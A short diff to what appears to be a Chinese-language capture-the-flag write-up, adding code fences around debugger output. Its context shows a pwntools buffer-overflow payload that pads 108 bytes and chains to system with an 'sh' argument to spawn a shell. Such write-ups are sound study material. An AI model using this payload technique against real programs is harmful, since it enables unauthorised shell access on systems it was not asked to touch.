@@ -104,10 +104,11 @@ Guessed arguments:
 
 改用 r.sendline("\x00"*108 + p32(0xdeadbeef)*1 + p32(0) * 11 + p32(system_addr) + p32(sh) * 2) 後：
 
+```
 Guessed arguments:
      arg[0]: 0xdeadbeef                    <============  108 ~ 112的位置
      arg[1]: 0xffbb7ad0 --> 0x0
-
+```
 
 ## The nerver ending crypto
 
